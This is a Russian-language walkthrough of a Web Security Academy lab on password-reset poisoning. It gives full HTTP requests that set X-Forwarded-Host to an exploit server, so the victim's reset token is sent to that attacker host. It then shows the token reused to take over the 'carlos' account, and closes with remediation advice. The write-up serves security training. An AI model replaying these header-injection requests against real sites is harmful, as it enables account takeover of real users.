## 🎯 Цель лаборатории

Получить доступ к аккаунту пользователя `carlos` через уязвимый механизм восстановления пароля.

Для решения необходимо:
- определить, как приложение строит ссылку сброса;
- проверить доверие к proxy-заголовкам;
- подменить домен в ссылке;
- перехватить токен на Exploit Server;
- использовать токен на реальном домене;
- сменить пароль Carlos и войти в аккаунт.

---

## 🧠 Что нужно знать

Безопасный процесс восстановления пароля:
1. Пользователь отправляет имя аккаунта.
2. Сервер создаёт одноразовый токен.
3. Сервер формирует ссылку на доверенном домене.
4. Ссылка отправляется на email.
5. Пользователь открывает ссылку и задаёт новый пароль.

Безопасный URL:
```text
https://example.com/forgot-password?token=ABCDEF
```

Опасная реализация использует домен из клиентского HTTP-заголовка.

---

## 💥 Суть уязвимости

Приложение доверяет заголовку:
```http
X-Forwarded-Host
```

Этот заголовок обычно добавляет reverse proxy или load balancer.

Типичная схема:
```text
Internet
   |
   v
Cloudflare
   |
   v
Nginx
   |
   v
Application
```

Если приложение принимает `X-Forwarded-Host` напрямую от клиента, атакующий может подставить собственный домен.

---

## 🔐 Нормальный и уязвимый поток

Безопасный поток:
```text
Пользователь -> Приложение -> Email -> Настоящий сайт
```

Уязвимый поток:
```text
Атакующий
   | POST /forgot-password
   | username=carlos
   | X-Forwarded-Host=exploit-server
   v
Приложение
   | создаёт отравленную ссылку
   v
Email Carlos
   | жертва открывает ссылку
   v
Exploit Server
   | токен попадает в Access Log
   v
Атакующий
```

## 🔎 Разведка

Перехватываем обычный запрос сброса пароля для собственного пользователя:
```http
POST /forgot-password HTTP/2
Host: 0a88003804ca288e8d52a59a004600df.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

username=wiener
```

Отправляем запрос в Burp Repeater.

Цели:
- определить endpoint;
- увидеть параметр пользователя;
- проверить влияние заголовков;
- изучить письмо для собственного аккаунта.

---

## 🧪 Проверка X-Forwarded-Host

Добавляем тестовый заголовок:
```http
X-Forwarded-Host: test.example.com
```

Полный запрос:
```http
POST /forgot-password HTTP/2
Host: 0a88003804ca288e8d52a59a004600df.web-security-academy.net
X-Forwarded-Host: test.example.com
Content-Type: application/x-www-form-urlencoded

username=wiener
```

В Email Client появляется ссылка:
```text
https://test.example.com/forgot-password?temp-forgot-password-token=...
```

Это подтверждает, что приложение использует `X-Forwarded-Host` при создании reset URL.

---

## 🎯 Отравление ссылки для Carlos

Копируем домен Exploit Server и отправляем:
```http
POST /forgot-password HTTP/2
Host: 0a88003804ca288e8d52a59a004600df.web-security-academy.net
X-Forwarded-Host: exploit-0a1200aa04aa00008000000000000000.exploit-server.net
Content-Type: application/x-www-form-urlencoded

username=carlos
```

Критические элементы:
```text
username=carlos
```
и:
```http
X-Forwarded-Host: <домен Exploit Server>
```

Сервер отправляет Carlos настоящую reset-ссылку с доменом атакующего.

## 🛰 Перехват токена

Открываем:
```text
Exploit Server -> Access log
```

В логе появляется запрос:
```http
GET /forgot-password?temp-forgot-password-token=do3au3tw50unahqat7ab2ms2g3bg6sp8 HTTP/1.1
Host: exploit-0a1200aa04aa00008000000000000000.exploit-server.net
```

Украденный токен:
```text
do3au3tw50unahqat7ab2ms2g3bg6sp8
```

`404 Not Found` не означает неудачу.
Запрос уже записан, а токен раскрыт.

---

## 🔓 Использование токена

Переносим токен на настоящий домен лаборатории:
```text
https://0a88003804ca288e8d52a59a004600df.web-security-academy.net/forgot-password?temp-forgot-password-token=do3au3tw50unahqat7ab2ms2g3bg6sp8
```

Открываем URL в браузере.
Сервер распознаёт валидный токен Carlos и показывает форму смены пароля.

Пример нового пароля:
```text
Pentest123!
```

После смены пароля выполняем вход:
```http
POST /login HTTP/2
Host: 0a88003804ca288e8d52a59a004600df.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

username=carlos&password=Pentest123%21
```

## 🧩 Полная цепочка атаки

```text
1. Перехватить POST /forgot-password
2. Отправить запрос в Repeater
3. Добавить X-Forwarded-Host
4. Проверить подмену на wiener
5. Подставить домен Exploit Server
6. Изменить username на carlos
7. Отправить запрос
8. Открыть Access Log
9. Найти temp-forgot-password-token
10. Перенести токен на реальный домен
11. Открыть форму сброса
12. Установить новый пароль
13. Войти как carlos
```

## ⚙️ Почему атака сработала

Уязвимость стала возможна из-за сочетания нескольких ошибок:

1. Приложение доверяет внешнему `X-Forwarded-Host`.
2. Заголовок используется в чувствительной функции.
3. Reset-токен передаётся в URL.
4. Жертва открывает ссылку.
5. Токен можно использовать с другого устройства.
6. Токен не привязан к исходному домену.

Концептуально уязвимый код выглядит так:
```python
host = request.headers.get("X-Forwarded-Host")
reset_url = "https://" + host + "/forgot-password?token=" + token
```

## 🧠 Как мыслить как пентестер

При проверке восстановления пароля задавай вопросы:

- Откуда приложение берёт домен?
- Можно ли влиять на `Host`?
- Используется ли `X-Forwarded-Host`?
- Поддерживается ли `Forwarded`?
- Есть ли `X-Host` или `X-Forwarded-Server`?
- Передаётся ли токен в query string?
- Привязан ли токен к пользователю?
- Привязан ли токен к сессии?
- Можно ли использовать токен с другого устройства?
- Инвалидируется ли токен после применения?
- Есть ли срок действия?

## 🛑 Типичные ошибки

### Ошибка 1. Менять только Host
Приложение может использовать только `X-Forwarded-Host`.

### Ошибка 2. Сразу атаковать Carlos
Сначала безопаснее подтвердить поведение на `wiener`.

### Ошибка 3. Использовать Exploit Server для смены пароля
Токен нужно перенести на реальный домен.

Неправильно:
```text
https://exploit-server.net/forgot-password?token=...
```

Правильно:
```text
https://academy.net/forgot-password?token=...
```

### Ошибка 4. Считать 404 провалом
404 означает только отсутствие страницы на Exploit Server.

### Ошибка 5. Скопировать токен не полностью
Нужно копировать всё значение без пробелов и обрезки.

### Ошибка 6. Ждать письмо Carlos
Письмо жертвы недоступно. Нужен переход жертвы и Access Log.

---

## 🛡 Как исправить уязвимость

### 1. Использовать фиксированный базовый URL
```python
BASE_URL = "https://example.com"
reset_url = BASE_URL + "/forgot-password?token=" + token
```

### 2. Не доверять proxy-заголовкам от клиента
Reverse proxy должен удалять входящие значения и выставлять собственные.

### 3. Использовать allowlist доменов
```python
ALLOWED_HOSTS = ["example.com", "www.example.com"]
```

### 4. Отклонять неизвестные Host
```http
HTTP/1.1 400 Bad Request
```

### 5. Делать токены одноразовыми
После успешной смены пароля токен должен стать недействительным.

### 6. Ограничивать срок жизни
Рекомендуемый порядок — минуты, а не часы или дни.

### 7. Инвалидировать старые сессии
После смены пароля активные сессии желательно завершить.

### 8. Не раскрывать секреты в URL без необходимости
URL может попасть в историю браузера, логи, аналитику и Referer.

## 🧾 Итог

Приложение использовало клиентский `X-Forwarded-Host` для формирования абсолютной ссылки восстановления пароля.

Атакующий подменил домен на Exploit Server и инициировал сброс для Carlos.

После перехода жертвы токен появился в Access Log.

Токен был использован на настоящем домене лаборатории, после чего пароль Carlos изменён.

Главный вывод:
```text
Нельзя использовать недоверенные HTTP-заголовки
для построения ссылок восстановления пароля.
```
